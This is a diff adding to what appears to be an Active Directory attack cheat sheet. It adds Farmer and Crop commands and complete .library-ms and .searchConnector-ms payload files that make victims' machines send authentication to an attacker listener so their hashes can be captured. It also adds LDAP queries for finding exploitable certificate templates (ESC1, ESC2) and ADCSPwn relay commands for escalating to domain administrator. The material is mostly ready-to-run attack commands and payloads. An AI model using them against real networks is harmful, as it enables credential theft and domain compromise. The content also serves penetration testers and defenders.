@@ -16,6 +16,10 @@
       - [PrintNightmare](#printnightmare)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
+      - [SCF Files](#scf-files)
+      - [URL Files](#url-files)
+      - [Windows Library Files](#windows-library-files)
+      - [Windows Search Connectors Files](#windows-search-connectors-files)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
     - [Exploit Group Policy Objects GPO](#exploit-group-policy-objects-gpo)
       - [Find vulnerable GPO](#find-vulnerable-gpo)
@@ -65,6 +69,7 @@
       - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
+      - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -709,6 +714,22 @@ Requirements:
 
 ### SCF and URL file attack against writeable share
 
+Theses attacks can be automated with [Farmer.exe](https://github.com/mdsecactivebreach/Farmer) and [Crop.exe](https://github.com/mdsecactivebreach/Farmer/tree/main/crop)
+
+```ps1
+# Farmer to receive auth
+farmer.exe <port> [seconds] [output]
+farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
+farmer.exe 8888 60 # one minute
+
+# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
+crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
+Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
+Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
+```
+
+#### SCF Files
+
 Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
 
 ```powershell
@@ -719,6 +740,8 @@ IconFile=\\10.10.10.10\Share\test.ico
 Command=ToggleDesktop
 ```
 
+#### URL Files
+
 This attack also works with `.url` files and `responder -I eth0 -v`.
 
 ```powershell
@@ -727,6 +750,53 @@ URL=whatever
 WorkingDirectory=whatever
 IconFile=\\10.10.10.10\%USERNAME%.icon
 IconIndex=1
+```
+
+#### Windows Library Files 
+
+> Windows Library Files (.library-ms)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-1003</iconReference>
+  <templateInfo>
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+#### Windows Search Connectors Files
+
+> Windows Search Connectors (.searchConnector-ms)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
+    <iconReference>imageres.dll,-1002</iconReference>
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <iconReference>\\\\workstation@8888\\folder.ico</iconReference>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>\\\\workstation@8888\\folder</url>
+    </simpleLocation>
+</searchConnectorDescription>
 ```
 
 
@@ -1808,6 +1878,8 @@ Exploitation:
 * Use [Certify.exe](https://github.com/GhostPack/Certify) to see if there are any vulnerable templates
     ```ps1
     Certify.exe find /vulnerable
+    or
+    PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
 * Use Certify to request a Certificate and add an alternative name (user to impersonate)
     ```ps1
@@ -1825,6 +1897,19 @@ Exploitation:
 **WARNING**: These certificates will still be usable even if the user or computer resets their password!
 
 **NOTE**: Look for **EDITF_ATTRIBUTESUBJECTALTNAME2**, **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**, **ManageCA** flags, and NTLM Relay to AD CS HTTP Endpoints.
+
+
+#### ESC2 - Misconfigured Certificate Templates
+
+Requirements:
+*  Allows requesters to specify a SAN in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)
+
+Exploitation:
+* Find template
+  ```ps1
+  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
+  ```
+* Request a certificate specifying the `/altname` as a domain admin like in [ESC1](#esc1---misconfigured-certificate-templates).
 
 
 #### ESC8 - AD CS Relay Attack
@@ -1869,7 +1954,26 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
     # Mimikatz
     mimikatz> lsadump::dcsync /user:krbtgt
     ```
+* Version 3: ADCSPwn
+    ```powershell
+    https://github.com/bats3c/ADCSPwn
+    adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
+    adcspwn.exe --adcs cs.pwnlab.local
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
+    adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
 
+    # ADCSPwn arguments
+    adcs            -       This is the address of the AD CS server which authentication will be relayed to.
+    secure          -       Use HTTPS with the certificate service.
+    port            -       The port ADCSPwn will listen on.
+    remote          -       Remote machine to trigger authentication from.
+    username        -       Username for non-domain context.
+    password        -       Password for non-domain context.
+    dc              -       Domain controller to query for Certificate Templates (LDAP).
+    unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
+    output          -       Output path to store base64 generated crt.
+    ```
 
 ### Dangerous Built-in Groups Usage
 
@@ -2915,3 +3019,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
 * [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
 * [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
